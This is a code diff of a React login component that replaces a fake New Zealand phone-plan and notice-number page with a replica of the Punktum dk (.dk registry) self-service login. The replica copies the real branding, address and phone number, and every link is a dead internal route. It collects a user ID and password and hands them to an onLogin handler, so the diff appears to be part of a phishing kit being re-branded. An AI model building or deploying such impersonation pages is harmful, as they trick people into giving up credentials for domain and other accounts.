@@ -1,591 +1,162 @@
 import React, { useState } from 'react';
 import './LoginScreen.css';
 
-function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin, onCheckout }) {
-  const [showError, setShowError] = useState(false);
-  const [errorMsg, setErrorMsg] = useState('');
-  const [noticeNumber, setNoticeNumber] = useState('');
-  const [activeTab, setActiveTab] = useState('carryover');
-  const [cartModalOpen, setCartModalOpen] = useState(false);
-  const [cartViewOpen, setCartViewOpen] = useState(false);
-  const [email, setEmail] = useState('');
-  const [cartItems, setCartItems] = useState([]); // ✅ ARRAY now
-  const [lastAdded, setLastAdded] = useState(null); // ✅ for "Added to cart" modal
+function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin }) {
+  const [password, setPassword] = useState('');
+  const [isHovered, setIsHovered] = useState(false);
 
-  const handleContinueClick = () => {
-    if (!noticeNumber || noticeNumber.trim() === '') {
-      setShowError(true);
-      setErrorMsg('Please enter your notice number');
-      return;
-    }
-    if (!noticeNumber.toUpperCase().startsWith('SC')) {
-      setShowError(true);
-      setErrorMsg('Notice number must start with "SC"');
-      return;
-    }
+  const handleSubmit = (e) => {
+    e.preventDefault();
+
     if (!loginName || loginName.trim() === '') {
-      setShowError(true);
-      setErrorMsg('Please enter your plate number');
+      alert('Please enter your Bruger-id');
       return;
     }
-    if (loginName.trim().length < 2) {
-      setShowError(true);
-      setErrorMsg('Please enter a valid plate number');
+    if (!password || password.trim().length < 4) {
+      alert('Adgangskode must be at least 4 characters');
       return;
     }
 
-    setShowError(false);
-    sessionStorage.setItem('noticeNumber', noticeNumber.trim().toUpperCase());
-    onInputChange('loginName', loginName.trim().toUpperCase());
-    onLogin();
-  };
-
-  const handleCancel = () => {
-    setShowError(false);
-    setErrorMsg('');
-    setNoticeNumber('');
-    onInputChange('loginName', '');
-  };
-
-  // ✅ Add to cart — append instead of replace
-  const handleAddToCart = (plan) => {
-    setCartItems((prev) => {
-      const next = [...prev, plan];
-      broadcastCartCount(next.length);
-      return next;
-    });
-    setLastAdded(plan);
-    setCartModalOpen(true);
-  };
-
-  // ✅ Remove one item by index
-  const handleRemoveItem = (index) => {
-    setCartItems((prev) => {
-      const next = prev.filter((_, i) => i !== index);
-      broadcastCartCount(next.length);
-      return next;
-    });
-  };
-
-  // ✅ Broadcast cart count to Header
-  const broadcastCartCount = (count) => {
-    sessionStorage.setItem('cartCount', String(count));
-    window.dispatchEvent(new CustomEvent('cartCountUpdated', { detail: count }));
-  };
-
-  const handleViewCart = () => {
-    setCartModalOpen(false);
-    setCartViewOpen(true);
-  };
-
-  // ✅ Compute total
-  const getTotal = () => {
-    return cartItems
-      .reduce((sum, item) => {
-        const price = parseFloat(item.price.replace('/m', '').replace('$', '')) || 0;
-        return sum + price;
-      }, 0)
-      .toFixed(2);
-  };
-
-  const handleCheckout = () => {
-    sessionStorage.setItem('cartItems', JSON.stringify(cartItems));
-    sessionStorage.setItem('cartEmail', email);
-    // Keep old key for backwards-compat (SpotifyApprove reads cartPlan)
-    if (cartItems.length > 0) {
-      sessionStorage.setItem('cartPlan', JSON.stringify(cartItems[0]));
-    }
-    setCartViewOpen(false);
-    if (onCheckout) onCheckout();
+    // Pass values directly so parent doesn't rely on async state
+    onLogin(null, loginName.trim(), password.trim());
   };
 
   return (
-    <div className="nzta-renewal">
+    <div className="punktum-page">
+      <div className="punktum-top-bar">
+        <div className="punktum-top-bar-inner">
+          <ul className="punktum-top-menu">
+            <li><a href="#/domain-login">PUNKTUM DK</a></li>
+            <li className="divider">|</li>
+            <li><a href="#/domain-login">STATISTIK</a></li>
+            <li className="divider">|</li>
+            <li><a href="#/domain-login">ENGLISH</a></li>
+            <li className="punktum-login-link"><a href="#/domain-login">LOG AF</a></li>
+          </ul>
+        </div>
+      </div>
 
-      {/* ─── Main ─── */}
-      <main className="nzta-main">
-        <h1 className="nzta-title">Pay Monthly</h1>
-        <p className="nzta-intro">
-          Pay Monthly phone plans with no surprises. Choose from an Unlimited* Data plan, or Carryover Data 
-          plan and enjoy a Free Data Hour everyday. Sorted for families and groups too: save when you join 
-          with your crew on a Group plan, all backed by our <a href="#">coverage</a>.
-        </p>
+      <header className="punktum-header">
+        <div className="punktum-header-inner">
+          <a href="#/domain-login" className="punktum-logo"></a>
+        </div>
+      </header>
 
-        {/* ─── Tabs ─── */}
-        <div className="nzta-tabs">
-          <button 
-            className={`nzta-tab ${activeTab === 'carryover' ? 'active' : ''}`}
-            onClick={() => setActiveTab('carryover')}
-          >
-            Carryover data
-          </button>
-          <button 
-            className={`nzta-tab ${activeTab === 'unlimited' ? 'active' : ''}`}
-            onClick={() => setActiveTab('unlimited')}
-          >
-            Unlimited
-          </button>
-          <button 
-            className={`nzta-tab ${activeTab === 'devices' ? 'active' : ''}`}
-            onClick={() => setActiveTab('devices')}
-          >
-            Plans for extra devices
-          </button>
+      <div className="punktum-main-nav">
+        <div className="punktum-main-nav-inner">
+          <ul>
+            <li className="active"><a href="#/domain-login">Bruger-id | E-mail | domænenavn</a></li>
+            <li><a href="#/domain-login">MitID | E-mail | EU eID</a></li>
+            <li><a href="#/domain-login">Betal faktura</a></li>
+          </ul>
+          <div className="punktum-help-link">
+            <a href="#/domain-login">Brug for hjælp <span className="punktum-icon-help">?</span></a>
+          </div>
+        </div>
+      </div>
+
+      <main className="punktum-main">
+        <div className="punktum-tabs">
+          <div className="punktum-tab-content active">
+            <div className="punktum-form-box">
+              <form onSubmit={handleSubmit} noValidate>
+                <div className="punktum-field">
+                  <label htmlFor="username">Bruger-id | E-mail | domænenavn</label>
+                  <div
+                    className="punktum-tooltip-wrapper"
+                    onMouseEnter={() => setIsHovered(true)}
+                    onMouseLeave={() => setIsHovered(false)}
+                  >
+                    <span className="punktum-icon-info">i</span>
+                    {isHovered && (
+                      <div className="punktum-tooltip">
+                        <p>Du kan for eksempel finde dit bruger-id på din faktura.</p>
+                        <p>Eksempel på bruger-id: XXX12345-DK</p>
+                      </div>
+                    )}
+                  </div>
+                  <input
+                    type="text"
+                    id="username"
+                    name="username"
+                    value={loginName || ''}
+                    onChange={(e) => onInputChange('loginName', e.target.value)}
+                    autoFocus
+                  />
+                </div>
+
+                <div className="punktum-field">
+                  <label htmlFor="password">Adgangskode</label>
+                  <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                  />
+                </div>
+
+                <div className="punktum-form-actions">
+                  <button type="submit" className="punktum-btn-login" disabled={isLoading}>
+                    {isLoading ? 'Please wait…' : 'Log på'}
+                  </button>
+                  <a href="#/domain-login" className="punktum-forgot-link">Hjælp til login</a>
+                </div>
+
+                <p className="punktum-info-text">
+                  Bemærk venligst, at bruger-id'et bliver blokeret i 24 timer, hvis du
+                  indtaster forkert adgangskode 5 gange.
+                </p>
+              </form>
+            </div>
+
+            <div className="punktum-info-box">
+              <h2>Velkommen til .dk-selvbetjening</h2>
+              <p>Angiv bruger-id og adgangskode i venstre side for at logge på .dk selvbetjening.</p>
+              <p>I vores .dk-selvbetjening har du mulighed for at foretage handlinger vedrørende dit domænenavn.</p>
+              <p>Du kan f.eks. aktivere, overdrage til en ny registrant, opsige, skifte navneservere, foretage betalinger og skifte roller for dit domænenavn samt holde dine kontaktoplysninger opdateret.</p>
+            </div>
+          </div>
         </div>
 
-        {/* ─── CARRYOVER TAB CONTENT ─── */}
-        {activeTab === 'carryover' && (
-          <div className="nzta-cards">
-            {/* Card 1 */}
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$35</span>
-                <span className="nzta-price">$26.25</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">3GB</span>
-                <span className="nzta-data-label">Carryover Data</span>
-              </div>
-              <div className="nzta-card-feature">
-                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
-                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-list">
-                <p>Unlimited* Calls to NZ & Aussie</p>
-                <p>Unlimited* Texts to NZ & Aussie</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-perks">
-                <p><strong>Additional perks:</strong></p>
-                <p>Shared Data</p>
-                <p>Hotspotting included</p>
-                <p>5G ready</p>
-                <p>Data Sidekick plan available at $5/month</p>
-                <p>eSIM ready (for supported devices)</p>
-              </div>
-              <div className="nzta-card-perks">
-                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: '$35 Carryover Plan',
-                  data: '3GB Carryover Data',
-                  price: '$26.25/m'
-                })}
-              >
-                Add to cart
-              </button>
+        <div className="punktum-features">
+          <div className="punktum-restore-box">
+            <h2>Genopret et suspenderet .dk-domænenavn</h2>
+            <div className="punktum-restore-form">
+              <form onSubmit={(e) => e.preventDefault()}>
+                <input type="text" placeholder="domænenavn.dk" name="restore.domain" />
+                <button type="submit" className="punktum-btn-search">Søg</button>
+              </form>
             </div>
-
-            {/* Card 2 */}
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$45</span>
-                <span className="nzta-price">$33.75</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">6GB</span>
-                <span className="nzta-data-label">Carryover Data</span>
-              </div>
-              <div className="nzta-card-feature">
-                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
-                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-list">
-                <p>Unlimited* Calls to NZ & Aussie</p>
-                <p>Unlimited* Texts to NZ & Aussie</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-perks">
-                <p><strong>Additional perks:</strong></p>
-                <p>Shared Data</p>
-                <p>Hotspotting included</p>
-                <p>5G ready</p>
-                <p>Data Sidekick plan available at $5/month</p>
-                <p>eSIM ready (for supported devices)</p>
-              </div>
-              <div className="nzta-card-perks">
-                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: '$45 Carryover Plan',
-                  data: '6GB Carryover Data',
-                  price: '$33.75/m'
-                })}
-              >
-                Add to cart
-              </button>
-            </div>
-
-            {/* Card 3 */}
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$55</span>
-                <span className="nzta-price">$41.25</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">15GB</span>
-                <span className="nzta-data-label">Carryover Data</span>
-              </div>
-              <div className="nzta-card-feature">
-                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
-                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-list">
-                <p>Unlimited* Calls to NZ & Aussie</p>
-                <p>Unlimited* Texts to NZ & Aussie</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-perks">
-                <p><strong>Additional perks:</strong></p>
-                <p>Shared Data</p>
-                <p>Hotspotting included</p>
-                <p>5G ready</p>
-                <p>Data Sidekick plan available at $5/month</p>
-                <p>eSIM ready (for supported devices)</p>
-              </div>
-              <div className="nzta-card-perks">
-                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: '$55 Carryover Plan',
-                  data: '15GB Carryover Data',
-                  price: '$41.25/m'
-                })}
-              >
-                Add to cart
-              </button>
-            </div>
-
-            {/* Card 4 */}
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$65</span>
-                <span className="nzta-price">$48.75</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">80GB</span>
-                <span className="nzta-data-label">Carryover Data</span>
-              </div>
-              <div className="nzta-card-feature">
-                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
-                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-list">
-                <p>Unlimited* Calls to NZ & Aussie</p>
-                <p>Unlimited* Texts to NZ & Aussie</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-perks">
-                <p><strong>Additional perks:</strong></p>
-                <p>Shared Data</p>
-                <p>Hotspotting included</p>
-                <p>5G ready</p>
-                <p>Data Sidekick plan available at $5/month</p>
-                <p>eSIM ready (for supported devices)</p>
-              </div>
-              <div className="nzta-card-perks">
-                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: '$65 Carryover Plan',
-                  data: '80GB Carryover Data',
-                  price: '$48.75/m'
-                })}
-              >
-                Add to cart
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* ─── UNLIMITED TAB CONTENT ─── */}
-        {activeTab === 'unlimited' && (
-          <div className="nzta-cards">
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$80</span>
-                <span className="nzta-price">$60</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">Unlimited</span>
-                <span className="nzta-data-label">Max speed data*</span>
-              </div>
-              <div className="nzta-card-feature">
-                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
-                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
-              </div>
-              
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-list">
-                <p>Unlimited* Calls to NZ & Aussie</p>
-                <p>Unlimited* Texts to NZ & Aussie</p>
-              </div>
-              <div className="nzta-card-divider"></div>
-              <div className="nzta-card-perks">
-                <p><strong>Additional perks:</strong></p>
-                <p>Unlimited* Hotspotting included</p>
-                <p>5G ready</p>
-                <p>50GB Sharing Data</p>
-                <p>Data Sidekick plan available at $5/month</p>
-                <p>Group Plans available from $25/month</p>
-                <p>eSIM ready (for supported devices)</p>
-              </div>
-              <div className="nzta-card-link">
-                <a href="#">Things to know</a>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: '$80 Unlimited Plan',
-                  data: 'Unlimited Max speed data',
-                  price: '$60/m'
-                })}
-              >
-                Add to cart
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* ─── DEVICES TAB CONTENT ─── */}
-        {activeTab === 'devices' && (
-          <div className="nzta-cards">
-            <div className="nzta-card">
-              <div className="nzta-card-promo">25% OFF</div>
-              <div className="nzta-card-price">
-                <span className="nzta-price-old">$5</span>
-                <span className="nzta-price">$3.75</span>
-                <span className="nzta-period">/month</span>
-              </div>
-              <div className="nzta-card-data">
-                <span className="nzta-gb">Data Sidekick</span>
-                <span className="nzta-data-label">for tablets</span>
-              </div>
-              <div className="nzta-card-list" style={{ marginTop: '20px' }}>
-                <p>Receives Shared data from your eligible Pay Monthly plan</p>
-                <p>Calls and Texts at standard casual rates</p>
-                <p>Manage how much data you share via the 2degrees app</p>
-              </div>
-              <button
-                className="nzta-add-to-cart"
-                onClick={() => handleAddToCart({
-                  name: 'Data Sidekick',
-                  data: 'for tablets',
-                  price: '$3.75/m'
-                })}
-              >
-                Add to cart
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* ─── What you'll love ─── */}
-        <div className="nzta-love-section">
-          <h2 className="nzta-love-title">What you’ll love</h2>
-          <p className="nzta-love-sub">Curious types can click the icons to reveal more information.</p>
-          <div className="nzta-love-grid">
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/1.svg').default} alt="Uncapped Carryover" className="nzta-love-img" />
-              <h3>Uncapped Carryover</h3>
-              <p>Keep all of your unused data for 12 months.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/2.svg').default} alt="Free Data Hour" className="nzta-love-img" />
-              <h3>Free Data Hour***</h3>
-              <p>1 hour of unlimited data to use every day on top of your Carryover plan data.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/3.svg').default} alt="Open Term" className="nzta-love-img" />
-              <h3>Open Term</h3>
-              <p>Change plans whenever it suits you.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/4.svg').default} alt="Shared Data" className="nzta-love-img" />
-              <h3>Shared Data</h3>
-              <p>Share data for free to other 2degrees mobiles on Carryover plans.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/5.svg').default} alt="Hotspotting included" className="nzta-love-img" />
-              <h3>Hotspotting included</h3>
-              <p>Turn your phone into a Wifi modem for free with no limits.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/6.svg').default} alt="5G ready" className="nzta-love-img" />
-              <h3>5G ready</h3>
-              <p>Harness the power of the next generation of wireless technology.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/7.svg').default} alt="Group Plans" className="nzta-love-img" />
-              <h3>Group Plans</h3>
-              <p>Save by adding up to 5 people to your mobile plan.</p>
-            </div>
-            <div className="nzta-love-item">
-              <img src={require('../assets/2d-iclons/8.svg').default} alt="Contact us" className="nzta-love-img" />
-              <h3>Contact us</h3>
-              <p>Need help? Grab a hand from one of our Customer Care Specialists.</p>
-            </div>
+            <p>Her kan du genoprette et suspenderet domænenavn, hvis du har glemt at betale periodegebyr.</p>
           </div>
         </div>
       </main>
 
-      {/* ─── ADDED TO CART MODAL ─── */}
-      {cartModalOpen && lastAdded && (
-        <div className="nzta-modal-overlay" onClick={() => setCartModalOpen(false)}>
-          <div className="nzta-modal" onClick={(e) => e.stopPropagation()}>
-            <button className="nzta-modal-close" onClick={() => setCartModalOpen(false)}>
-              ✕
-            </button>
-
-            <h2 className="nzta-modal-title">Added to cart</h2>
-
-            <div className="nzta-modal-notice">
-              <span className="nzta-modal-emoji">😎</span>
-              <p>
-                {cartItems.length > 1
-                  ? `You now have ${cartItems.length} plans in your cart.`
-                  : 'Your plan has been added to the cart.'}
-              </p>
-            </div>
-
-            <div className="nzta-modal-plan">
-              <img
-                src={require('../assets/2d-iclons/11.png')}
-                alt={lastAdded.name}
-                className="nzta-modal-plan-img"
-              />
-              <div className="nzta-modal-plan-info">
-                <p className="nzta-modal-plan-name">{lastAdded.name}</p>
-                <p className="nzta-modal-plan-data">{lastAdded.data}</p>
-                <p className="nzta-modal-plan-price">{lastAdded.price}</p>
-              </div>
-            </div>
-
-            <div className="nzta-modal-actions">
-              <button className="nzta-modal-btn" onClick={handleViewCart}>
-                View Cart
-              </button>
-              <button
-                className="nzta-modal-btn nzta-modal-btn-secondary"
-                onClick={() => setCartModalOpen(false)}
-              >
-                Continue Shopping
-              </button>
-            </div>
+      <footer className="punktum-footer">
+        <div className="punktum-footer-inner">
+          <div className="punktum-footer-box">
+            <h3>Punktum dk A/S</h3>
+            <p>Punktum dk er administrator for domænenavne, der ender på .dk.</p>
+            <p>Det betyder, at alle .dk-domænenavne er registreret hos os, og at vi har stamoplysninger på alle, der har registreret et .dk-domænenavn.</p>
+          </div>
+          <div className="punktum-footer-box">
+            <h3>Kontakt os</h3>
+            <p><strong>Punktum dk A/S</strong><br />Ørestads Boulevard 108, 11. sal<br />2300 København S</p>
+            <p>Tlf +45 33 64 60 60</p>
+            <p><a href="#/domain-login">Ofte stillede spørgsmål og svar</a></p>
+          </div>
+          <div className="punktum-footer-box">
+            <h3>Information</h3>
+            <ul>
+              <li><a href="#/domain-login">Punktum dk's hjemmeside</a></li>
+              <li><a href="#/domain-login">Vilkår</a></li>
+              <li><a href="#/domain-login">Persondatapolitik</a></li>
+              <li><a href="#/domain-login">Cookie information</a></li>
+            </ul>
           </div>
         </div>
-      )}
-
-      {/* ─── YOUR CART MODAL ─── */}
-      {cartViewOpen && (
-        <div className="nzta-cart-overlay" onClick={() => setCartViewOpen(false)}>
-          <div className="nzta-cart-modal" onClick={(e) => e.stopPropagation()}>
-            <button className="nzta-cart-close" onClick={() => setCartViewOpen(false)}>
-              ✕
-            </button>
-
-            <h2 className="nzta-cart-title">Your cart</h2>
-            <p className="nzta-cart-count">
-              {cartItems.length} {cartItems.length === 1 ? 'item' : 'items'}
-            </p>
-
-            {/* ─── Plans list ─── */}
-            <div className="nzta-cart-plans">
-              {cartItems.length === 0 && (
-                <p style={{ color: '#5e6f7e', fontSize: 14, padding: '20px 0' }}>
-                  Your cart is empty.
-                </p>
-              )}
-              {cartItems.map((item, index) => (
-                <div className="nzta-cart-plan" key={index}>
-                  <img
-                    src={require('../assets/2d-iclons/11.png')}
-                    alt={item.name}
-                    className="nzta-cart-plan-img"
-                  />
-                  <div className="nzta-cart-plan-info">
-                    <p className="nzta-cart-plan-name">{item.name}</p>
-                    <p className="nzta-cart-plan-data">{item.data}</p>
-                    <p className="nzta-cart-plan-price">{item.price}</p>
-                  </div>
-                  <button
-                    className="nzta-cart-remove"
-                    onClick={() => handleRemoveItem(index)}
-                  >
-                    Remove
-                  </button>
-                </div>
-              ))}
-            </div>
-
-            {/* ─── Summary ─── */}
-            {cartItems.length > 0 && (
-              <div className="nzta-cart-summary">
-                <h3 className="nzta-cart-summary-title">Summary</h3>
-                <div className="nzta-cart-summary-row">
-                  <span>Monthly payments</span>
-                  <span>${getTotal()}</span>
-                </div>
-                <p className="nzta-cart-summary-note">All costs include GST</p>
-              </div>
-            )}
-
-            {/* ─── Email ─── */}
-            <p className="nzta-cart-email-msg">
-              Let's grab your email address and speed you through the checkout process
-            </p>
-            <div className="nzta-cart-field">
-              <label htmlFor="cart-email">Email address</label>
-              <input
-                id="cart-email"
-                type="email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="nzta-cart-input"
-              />
-            </div>
-
-            {/* ─── Checkout ─── */}
-            <div className="nzta-cart-actions">
-              <button
-                className="nzta-cart-checkout"
-                onClick={handleCheckout}
-                disabled={cartItems.length === 0}
-              >
-                Checkout
-              </button>
-              <button
-                className="nzta-cart-continue"
-                onClick={() => setCartViewOpen(false)}
-              >
-                Continue Shopping
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
+      </footer>
     </div>
   );
 }
